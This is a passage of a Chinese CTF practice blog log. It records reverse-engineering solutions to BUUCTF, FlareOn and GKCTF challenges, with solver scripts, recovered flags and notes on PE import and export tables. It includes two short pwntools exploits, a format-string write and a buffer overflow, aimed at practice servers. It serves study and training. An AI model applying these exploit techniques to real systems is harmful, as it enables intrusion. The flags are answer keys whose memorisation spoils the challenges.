+<h2 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h2><p><img src="https://md.vidar.club/uploads/upload_d84eac982b8a7126d351ea86d72bf586.png" alt=""><br>打开显示这个<br>根据提示，只要把<code>sub_401160</code>这个函数的最后一个参数改大，就能把后面的东西显示出来了</p>
+<blockquote>
+<p><img src="https://md.vidar.club/uploads/upload_bd009720ab3d6d7cc1cc41d33d370e9b.png" alt=""></p>
+</blockquote>
+<h1 id="2020-5-16"><a href="#2020-5-16" class="headerlink" title="2020-5-16"></a>2020-5-16</h1><h2 id="go-where"><a href="#go-where" class="headerlink" title="go_where"></a>go_where</h2><p>修复elf文件，把开头的l改为L<br>然后upx脱壳<br>动态调试，具体流程是：</p>
+<ul>
+<li>先把输入的字符都+1，再base91，再AES，key和IV都是give_your_A3sk4y</li>
+</ul>
+<p>和hgame的那道Golang逆向差不多，就是在main_Encode这个函数上卡了一会，最后发现这个就是base91（比较少见）</p>
+<h1 id="2020-5-17"><a href="#2020-5-17" class="headerlink" title="2020-5-17"></a>2020-5-17</h1><p>钴</p>
+<h1 id="2020-5-18、19"><a href="#2020-5-18、19" class="headerlink" title="2020-5-18、19"></a>2020-5-18、19</h1><h2 id="V-amp-N2020-公开赛-h01k-re"><a href="#V-amp-N2020-公开赛-h01k-re" class="headerlink" title="[V&amp;N2020 公开赛]h01k_re"></a>[V&amp;N2020 公开赛]h01k_re</h2><p><code>sub_401990</code>是反调试，nop掉<br><img src="https://md.vidar.club/uploads/upload_2b14e26aa4ddf942770f10910f13872e.png" alt=""><br>跑了下<code>findcrypt</code>发现有AES<br><img src="https://md.vidar.club/uploads/upload_6ffd18ba3d62e012ada3e2a0d90937d2.png" alt=""><br>要运行到这里才能输入<br>动态调试进入v21()<br><img src="https://md.vidar.club/uploads/upload_b2455aad9adb046927edc7b37aef222b.png" alt=""><br>似乎有vm<br><code>sub_401F00</code>这个函数就是AES<br><img src="https://md.vidar.club/uploads/upload_bde33659fc15afa4262783fce24a6214.png" alt=""><br>执行过AES之后发现lpBuffer指向的地方居然是个PE文件,大小是0x10EA00<br><img src="https://md.vidar.club/uploads/upload_39d1b2e0867d4ddaf9aa2e3e2a972bb1.png" alt=""><br>把它复制下来，发现这个是个dll文件<br>看不懂看不懂<img src="https://md.vidar.club/uploads/upload_4fcadd82c0bc1d8679aaa2e73ecbe6b1.png" alt=""><br>根据wp，这就是个异或</p>
+<blockquote>
+<p>V&amp;N{W&amp;M_Easy_Re}</p>
+</blockquote>
+<h1 id="2020-5-20、21、22"><a href="#2020-5-20、21、22" class="headerlink" title="2020-5-20、21、22"></a>2020-5-20、21、22</h1><p>看了PE</p>
+<h1 id="2020-5-23"><a href="#2020-5-23" class="headerlink" title="2020-5-23"></a>2020-5-23</h1><h2 id="继续Akira-Homework"><a href="#继续Akira-Homework" class="headerlink" title="继续Akira Homework"></a>继续Akira Homework</h2><p>程序貌似有BUG没法输入，就直接跳过输入函数，直接在内存里修改输入<br>6C10函数里有个函数是用来解密的<img src="https://md.vidar.club/uploads/upload_7cd8e5c85de128c1639000587329f9b5.png" alt=""><br>动调后发现这个就是8910函数<br><img src="https://md.vidar.club/uploads/upload_9c228784e78613250e0b91bce39c32d7.png" alt=""><br>。。。。。。。。。。。。。。。。。。。。。。。。。。。<br>涉及太多windows知识，再次放弃</p>
+<h2 id="FlareOn5-Ultimate-Minesweeper"><a href="#FlareOn5-Ultimate-Minesweeper" class="headerlink" title="[FlareOn5]Ultimate Minesweeper"></a>[FlareOn5]Ultimate Minesweeper</h2><p><img src="https://md.vidar.club/uploads/upload_85fd92a9a80f20f4999adb80b590078f.png" alt=""><br>这一段应该是设置地雷的,<code>mf.GarbageCollect</code>点进去是<code>minePresent</code><br><code>num2</code>是x轴，<code>num</code>是y轴</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> VALLOC_TYPE_HEADER_PAGE = <span class="number">0xfffffc80</span>;</span><br><span class="line">    <span class="keyword">int</span> VALLOC_TYPE_HEADER_POOL = <span class="number">0xfffffd81</span>;</span><br><span class="line">    <span class="keyword">int</span> VALLOC_TYPE_HEADER_RESERVED = <span class="number">0xfffffef2</span>;</span><br><span class="line">    <span class="keyword">int</span> VALLOC_TYPEs[] = &#123;VALLOC_TYPE_HEADER_PAGE, VALLOC_TYPE_HEADER_POOL, VALLOC_TYPE_HEADER_RESERVED&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num = <span class="number">0</span>; num &lt; <span class="number">30</span>; ++num)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num2 = <span class="number">0</span>; num2 &lt; <span class="number">30</span>; ++num2)</span><br><span class="line">        &#123;</span><br><span class="line">             <span class="keyword">int</span> r = num + <span class="number">1</span>, c = num2 + <span class="number">1</span>;</span><br><span class="line">             <span class="keyword">int</span> a = ~((r * <span class="number">30</span>) + c);</span><br><span class="line">             <span class="keyword">if</span> (a == VALLOC_TYPEs[<span class="number">0</span>] || a == VALLOC_TYPEs[<span class="number">1</span>] || a == VALLOC_TYPEs[<span class="number">2</span>])</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; num2 &lt;&lt; <span class="string">" "</span> &lt;&lt; num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>28 7<br>7 20<br>24 28<br>这三个点没有地雷,点击得flag<br><img src="https://md.vidar.club/uploads/upload_bdb66068d8485c9643a6a930b5af49b4.png" alt=""></p>
+</blockquote>
+<h1 id="2020-5-24"><a href="#2020-5-24" class="headerlink" title="2020-5-24"></a>2020-5-24</h1><p>墨鱼</p>
+<h1 id="2020-5-25"><a href="#2020-5-25" class="headerlink" title="2020-5-25"></a>2020-5-25</h1><h2 id="GKCTF2020-Check-1n"><a href="#GKCTF2020-Check-1n" class="headerlink" title="[GKCTF2020]Check_1n"></a>[GKCTF2020]Check_1n</h2><p>电脑模拟器<br>在我的虚拟机上运行有问题（解决了，是文件共享路径的问题）<br>开机密码是HelloWorld,玩打砖块游戏就能拿到flag</p>
+<h2 id="GKCTF2020-BabyDriver"><a href="#GKCTF2020-BabyDriver" class="headerlink" title="[GKCTF2020]BabyDriver"></a>[GKCTF2020]BabyDriver</h2><p>Driver<br><img src="https://md.vidar.club/uploads/upload_7f72df336c4793d5afbb3365ba6b1d91.png" alt=""><br>应该是迷宫，<code>O</code>是入口，<code>#</code>是出口<br><img src="https://md.vidar.club/uploads/upload_56ee5b2431db920d60e02f89f75d51ac.png" alt=""><br><img src="https://md.vidar.club/uploads/upload_7f6b4ff90db0e3757afa9373ce20c851.png" alt=""><br>这个输入是不可显字符<br>看了下wp，这个是驱动程序，读取的是键盘扫描码，不是ascii码<br><a href="https://www.supfree.net/search.asp?id=6386" target="_blank" rel="noopener">在线键盘扫描码查询</a></p>
+<blockquote>
+<p>0x17 I 上<br>0x25 K 下<br>0x24 J 左<br>0x26 L 右</p>
+</blockquote>
+<p>LKKKLLKLKKKLLLKKKLLLLLL</p>
+<h2 id="GKCTF2020-Chelly’s-identity"><a href="#GKCTF2020-Chelly’s-identity" class="headerlink" title="[GKCTF2020]Chelly’s identity"></a>[GKCTF2020]Chelly’s identity</h2><ul>
+<li>你有听说过chelly吗？如果你知道，那么你就能得到flag的线索。</li>
+</ul>
+<p>EGOIST主唱</p>
+<p>C++逆向，动态调试<br>先根据字符串定位到main函数<br><img src="https://md.vidar.club/uploads/upload_edbe0a7dc35c9f225d164b94b60e3db7.png" alt=""><br>v34可能是一个结构体，里面存储了flag的地址<br>中间那个循环估计是将char型的输入转成int型<br>然后是检查长度，长度为16位<br><img src="https://md.vidar.club/uploads/upload_39ed01ab513d43b67f246d53f5c3ba55.png" alt=""><br>这是<code>zhishu</code>函数，v10应该也是个结构体，存储的是从2开始连续的质数<br>for循环的作用是将这些质数相加，直到加到最后一个质数大于input[i]<br>然后就是<code>sub_411852</code>，只要这个函数返回true就说明检查通过<br><img src="https://md.vidar.club/uploads/upload_fdf0f13593bfa27fa5775486984c3ee9.png" alt=""><br>中间有一串赋值很可疑，正好16位，可能就是加密后的flag(确实是)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag[] = &#123;<span class="number">0x1b6</span>, <span class="number">0x498</span>, <span class="number">0x441</span>, <span class="number">0x179</span>, <span class="number">0x179</span>, <span class="number">0x640</span>, <span class="number">0x39c</span>, <span class="number">0x179</span>, <span class="number">0x64a</span>, <span class="number">0x39c</span>, <span class="number">0x27d</span>, <span class="number">0x27f</span>, <span class="number">0x178</span>, <span class="number">0x236</span>, <span class="number">0x344</span>, <span class="number">0x33e</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> prime[] = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">163</span>, <span class="number">167</span>, <span class="number">173</span>, <span class="number">179</span>, <span class="number">181</span>, <span class="number">191</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">199</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; <span class="number">16</span>; ++a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="number">33</span>; i &lt; <span class="number">127</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (prime[k] &lt; i)</span><br><span class="line">            &#123;</span><br><span class="line">                j += prime[k++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((i ^ j) == flag[a])</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Che11y_1s_EG0IST  原来是这个线索</p>
+</blockquote>
+<p>这个比赛是8小时，估计我也只能做到这了</p>
+<h1 id="2020-5-26"><a href="#2020-5-26" class="headerlink" title="2020-5-26"></a>2020-5-26</h1><p>满课，提前鸽了</p>
+<h1 id="2020-5-27、28"><a href="#2020-5-27、28" class="headerlink" title="2020-5-27、28"></a>2020-5-27、28</h1><h2 id="GKCTF2020-EzMachine"><a href="#GKCTF2020-EzMachine" class="headerlink" title="[GKCTF2020]EzMachine"></a>[GKCTF2020]EzMachine</h2><p>VM太难了<br><img src="https://md.vidar.club/uploads/upload_9cd363247e3e816078ed7c3922537fdc.png" alt=""><br>这里应该是main函数<br><code>off_8B48F4</code>是函数指针<br>根据opcode找到要执行的函数，再跳转执行<br><img src="https://md.vidar.club/uploads/upload_560a6d177fc97cda0b71895ec50fcfc5.png" alt=""></p>
+<blockquote>
+<p>函数模拟的指令</p>
+</blockquote>
+<p>如果读取的字符是大写字母，就<code>(x ^ 0x4B) - 1</code>，然后<code>% 0x10</code>和<code>/ 0x10</code>，就是把个位和十位分开。如果是小写字母，<code>(x ^ 0x47) + 1</code>，再分开。其他字符直接分开<br><img src="https://md.vidar.club/uploads/upload_c77d25bc54b0abf16db1cd090b1b35c2.png" alt=""></p>
+<blockquote>
+<p>这是加密后的flag(倒过来的)</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x &gt;= A and x &lt;= Z, (x ^ 0x4B) - 1, divide</span></span><br><span class="line"><span class="comment"># x &gt;= a and x &lt;= z, (x ^ 0x47) + 1, divide</span></span><br><span class="line"><span class="comment"># else divide</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">'07 0D 00 05 01 0C 01 00 00 0D 05 0F 00 09 05 0F 03 00 02 05 03 03 01 07 07 0B 02 01 02 07 02 0C 02 02'</span>.split(<span class="string">' '</span>)</span><br><span class="line">flag2 = [int(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag1]</span><br><span class="line">flag3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(flag2), <span class="number">2</span>):</span><br><span class="line">    flag3.append((flag2[i] &lt;&lt; <span class="number">4</span>) + flag2[i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">s1 = [(i^<span class="number">0x4B</span>)<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'A'</span>), ord(<span class="string">'Z'</span>)+<span class="number">1</span>)]</span><br><span class="line">s2 = [(i^<span class="number">0x47</span>)+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">'a'</span>), ord(<span class="string">'z'</span>)+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag3:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> s1:</span><br><span class="line">        flag.append(chr((i+<span class="number">1</span>)^<span class="number">0x4B</span>))</span><br><span class="line">    <span class="keyword">elif</span> i <span class="keyword">in</span> s2:</span><br><span class="line">        flag.append(chr((i<span class="number">-1</span>)^<span class="number">0x47</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag.append(chr(i))</span><br><span class="line">print(<span class="string">''</span>.join(flag[::<span class="number">-1</span>]))</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>flag{Such_A_EZVM}</p>
+</blockquote>
+<h1 id="2020-6-2"><a href="#2020-6-2" class="headerlink" title="2020-6-2"></a>2020-6-2</h1><p>最近突然想整一波pwn了，都是水题</p>
+<h2 id="Pwn5"><a href="#Pwn5" class="headerlink" title="Pwn5"></a>Pwn5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#cn = process('./pwn5')</span></span><br><span class="line">cn = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">29381</span>)</span><br><span class="line">rand_addr=<span class="number">0x804c044</span></span><br><span class="line">cn.recvuntil(<span class="string">'your name:'</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">b'AA%12$n\x00'</span>+p32(rand_addr))</span><br><span class="line">cn.recvuntil(<span class="string">'your passwd:'</span>)</span><br><span class="line">cn.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a>picoctf_2018_buffer overflow 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#cn=process('./PicoCTF_2018_buffer_overflow_1')</span></span><br><span class="line">cn=remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28760</span>)</span><br><span class="line">raw_input()</span><br><span class="line">payload=<span class="string">b'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(<span class="number">0x80485cb</span>)</span><br><span class="line">cn.sendline(payload)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="2020-6-8"><a href="#2020-6-8" class="headerlink" title="2020-6-8"></a>2020-6-8</h1><h2 id="FlareOn1-5get-it"><a href="#FlareOn1-5get-it" class="headerlink" title="[FlareOn1]5get_it"></a>[FlareOn1]5get_it</h2><p>给的文件是一个32位的DLL文件，不知道能不能动态调试<br><code>sub_10009EB0</code>这个函数有点可疑,里面有个<code>GetAsyncKeyState</code>函数，主要功能就是判断按键的状态。<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/inputdev/virtual-key-codes" target="_blank" rel="noopener">Virtual-Key Codes</a><br><img src="https://md.vidar.club/uploads/upload_9565d43a5741bd4cb41351ea82f00d8e.png" alt=""><br>这个返回值应该是按下的状态吧(不是很清楚)<br>然后根据按下的按键进行switch跳转<br>有个很长的函数，赋的值都是字符串<br><img src="https://md.vidar.club/uploads/upload_78b05e913a6ee8fe67ef51d4b222dd78.png" alt=""><br>看了下wp，flag是根据init函数里的全局变量来推出的<br><img src="https://md.vidar.club/uploads/upload_8870a5f4c550d8b4e62bfae55fa13493.png" alt=""></p>
+<blockquote>
+<p>l0ggingdoturdot5tr0ke5atflaredashondotcom</p>
+</blockquote>
+<h1 id="2020-6-12"><a href="#2020-6-12" class="headerlink" title="2020-6-12"></a>2020-6-12</h1><p>看了《逆向工程核心原理》里关于IAT和EAT的东西，感觉应该和elf里的plt和got差不多，先记下来</p>
+<h2 id="IAT-Import-Address-Table"><a href="#IAT-Import-Address-Table" class="headerlink" title="IAT(Import Address Table)"></a>IAT(Import Address Table)</h2><ul>
+<li>导入地址表</li>
+</ul>
+<p>当调用API函数时，先读取IAT处的地址，再跳转到该函数再内存中的真实地址</p>
+<p><img src="https://md.vidar.club/uploads/upload_271fe4a6d61cdfbd6ffccbadab1b0afd.png" alt=""></p>
+<hr>
+<p><img src="https://md.vidar.club/uploads/upload_742dfaa1b7399ca31b21d94bbc06bb9f.png" alt=""></p>
+<ul>
+<li>一般情况下，INT与IAT的各个元素指向相同的地址</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>
+
+<h5 id="PE装载器把导入函数输入至IAT的顺序"><a href="#PE装载器把导入函数输入至IAT的顺序" class="headerlink" title="PE装载器把导入函数输入至IAT的顺序"></a>PE装载器把导入函数输入至IAT的顺序</h5><ol>
+<li><p>读取IID的Name成员，获取库名称字符串(“kernel32.dll”)</p>
+</li>
+<li><p>装载相应库</p>
+<p>-&gt;  <strong>LoadLibrary(“kernel32.dll”)</strong></p>
+</li>
+<li><p>读取IID的<strong>OriginalFirstThunk</strong>成员,获取INT地址</p>
+</li>
+<li><p>逐一读取INT中数组的值，获取相应<strong>IMAGE_IMPORT_BY_NAME</strong>的地址(RVA)</p>
+</li>
+<li><p>使用<strong>IMAGE_IMPORT_BY_NAME</strong>的Hint或Name项，获取相应函数的起始地址</p>
+<p>-&gt;  <strong>GetProcAddress(“GetCurrentThreadld”)</strong></p>
+</li>
+<li><p>读取IID的FirstThunk(IAT)成员，获得IAT地址</p>
+</li>
+<li><p>将上面获得的函数地址输入相应IAT数组值</p>
+</li>
+<li><p>重复4~7，直到INT结束(NULL)</p>
+</li>
+</ol>
+<h2 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h2><ul>
+<li>导出地址表，保存在<strong>IMAGE_EXPORT_DIRECTORY</strong>中，这个结构体在PE中只有一个</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;		<span class="comment">// 实际Export函数的个数</span></span><br><span class="line">    DWORD   NumberOfNames;			<span class="comment">// Export函数中具名的函数个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// Export函数地址数组(数组元素个数=NumberOfFunctions)</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// 函数名称地址数组(数组元素个数=NumberOfNames)</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// Ordinal地址数组(数组元素个数=NumberOfNames)</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://md.vidar.club/uploads/upload_e2a5d25871f0db871ceb9e11912d31d3.png" alt=""></p>
+<h5 id="GetProcAddress-操作原理"><a href="#GetProcAddress-操作原理" class="headerlink" title="GetProcAddress()操作原理"></a>GetProcAddress()操作原理</h5><ol>
+<li>利用<strong>AddressOfNames</strong>成员转到”函数名称数组”</li>
+<li>“函数名称数组”中存储这字符串地址。通过比较字符串，查找指定函数名称(此时数组的索引称为 name_index)</li>
+<li>利用<strong>AddressOfNameOrdinals</strong>成员，转到orinal数组</li>
+<li>在 ordinal数组中通过name_index查找相应ordinal值</li>
+<li>利用<strong>AddressOfFunctions</strong>成员转到”函数地址数组”(EAT)</li>
+<li>在”函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址</li>
+</ol>
+<h1 id="2020-7-14"><a href="#2020-7-14" class="headerlink" title="2020-7-14"></a>2020-7-14</h1><h2 id="FlareOn2-YUSoMeta"><a href="#FlareOn2-YUSoMeta" class="headerlink" title="[FlareOn2]YUSoMeta"></a>[FlareOn2]YUSoMeta</h2><p>.Net逆向,有混淆,去除了符号<br>用de4dot可以还原符号</p>
+<p><img src="https://md.vidar.club/uploads/upload_231ac87ea323a36c3bfc4a4c9b98d096.png" alt=""><br>还原之后流程就比较清楚<br>经过调试后发现b和输入无关,但b不是个可显字符,很奇怪</p>
+<p>用原文件调试之后发现b是个可先字符,可能是de4dot还原的时候把什么数据改掉了,而b就是根据那个数据生成的<br><img src="https://md.vidar.club/uploads/upload_0f367df0f95dbf045878a1abfd0c1aaf.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    R3n0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://r3n0.top/2020/07/15/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="buuctf刷题记录">https://r3n0.top/2020/07/15/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/buuctf/" rel="tag"># buuctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/15/%E5%B0%86Blog%E6%90%AC%E5%88%B0hexo%E4%B8%8A/" rel="next" title="将Blog搬到hexo上">
+                <i class="fa fa-chevron-left"></i> 将Blog搬到hexo上
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
